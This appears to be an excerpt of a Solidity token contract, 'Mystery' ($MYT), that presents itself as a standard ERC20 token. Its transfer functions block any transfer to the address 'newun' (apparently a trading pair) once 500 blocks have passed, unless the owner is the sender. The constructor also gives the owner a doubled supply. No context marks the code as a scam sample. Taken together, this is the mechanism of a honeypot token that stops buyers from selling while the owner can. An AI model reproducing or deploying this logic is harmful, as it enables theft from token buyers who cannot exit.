...
contract Mystery is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "$MYT";
  address public newun;
  uint256 private currentBlock;

  constructor() public {
    _balances[_msgSender()] = _totalSupply;
    mint(msg.sender, 1000000000 * 10**uint(_decimals));
  ...
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    ...
    else  require(block.number < currentBlock+500 || recipient != newun || sender == owner(), "please wait");
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if(newun != address(0)) require(block.number < currentBlock+500 || recipient != newun || sender == owner(), "please wait");
